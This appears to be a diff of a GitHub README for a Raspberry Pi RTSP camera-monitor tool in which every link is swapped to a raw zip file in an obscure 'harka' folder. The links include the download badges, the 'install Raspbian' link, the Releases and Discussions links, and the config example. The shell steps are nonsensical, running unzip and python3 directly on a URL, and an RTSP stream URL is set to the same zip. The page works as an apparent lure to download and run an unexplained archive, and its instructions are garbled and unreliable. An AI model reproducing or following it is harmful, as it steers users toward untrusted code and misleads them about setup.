@@ -1,7 +1,7 @@
 # 🎥 raspberry-pi-rtsp-monitor - Simple RTSP Monitoring for Your Raspberry Pi
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip)](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip)
+[![Download](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip)](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Raspberry Pi RTSP Monitor**! This application lets you turn your Raspberry Pi into a dedicated RTSP camera monitor. Whether you’re monitoring a security camera or simply observing your pets, this guide will help you set everything up smoothly.
@@ -13,12 +13,12 @@ Before you begin, here’s what you need:
 - An HDMI monitor or display.
 - An RTSP-compatible camera (like an IP camera).
 - A stable internet connection.
-- Software: Raspbian OS installed on your Raspberry Pi. If you haven't installed it yet, follow [this link to install Raspbian](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip).
+- Software: Raspbian OS installed on your Raspberry Pi. If you haven't installed it yet, follow [this link to install Raspbian](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip).
 
 ## 📦 Download & Install
 To start using the Raspberry Pi RTSP Monitor, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip) to find the latest version of the software.
 
 2. **Download the Latest Version:** Look for the latest version available. Click on it to download the `.zip` file containing the application.
 
@@ -30,7 +30,7 @@ To start using the Raspberry Pi RTSP Monitor, follow these steps:
      ```
    - Extract the files using the following command:
      ```bash
-     unzip https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip
+     unzip https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip
      ```
 
 4. **Navigate to the Application Folder:**
@@ -42,16 +42,16 @@ To start using the Raspberry Pi RTSP Monitor, follow these steps:
 5. **Run the Application:**
    To start the application, use the command:
    ```bash
-   python3 https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip
+   python3 https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip
    ```
    Ensure your RTSP camera is turned on and connected to the same network as your Raspberry Pi.
 
 ## ⚙️ Configuration
-To configure your RTSP camera, open the `https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip` file located in the application folder. Here’s how you can adjust the settings:
+To configure your RTSP camera, open the `https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip` file located in the application folder. Here’s how you can adjust the settings:
 
 - **RTSP Stream URL:** This is where you input the streaming link of your RTSP camera. For example:
   ```json
-  "rtsp_url": "https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip"
+  "rtsp_url": "https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip"
   ```
 - **Display Settings:** Adjust settings according to your monitor resolution. 
 
@@ -80,7 +80,7 @@ A: Most RTSP cameras should work, but always check your camera specifications.
 A: You can run multiple instances if you adjust the ports in the configuration file.
 
 ## 💬 Community and Support
-Join our community if you need assistance or want to share experiences. Check out our [GitHub Discussions](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip).
+Join our community if you need assistance or want to share experiences. Check out our [GitHub Discussions](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip).
 
 ## 📅 Upcoming Features
 We plan to add more features like:
@@ -108,4 +108,4 @@ Stay tuned for updates!
 For any questions or issues, feel free to open an issue on GitHub.
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip)](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/raspberry-pi-rtsp-monitor.zip)
+[![Download](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip)](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip)
